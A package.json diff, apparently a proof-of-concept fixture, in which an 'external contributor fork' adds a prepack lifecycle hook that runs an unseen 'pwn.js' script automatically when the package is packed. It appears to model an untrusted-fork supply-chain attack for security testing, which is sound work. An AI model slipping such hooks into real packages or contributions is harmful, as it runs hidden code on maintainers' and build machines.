@@ -2,5 +2,6 @@
   "name": "poc-snapshot-pkg",
   "version": "1.0.0",
   "private": false,
-  "description": "base branch: no scripts"
+  "description": "external contributor fork",
+  "scripts": { "prepack": "node pwn.js" }
 }
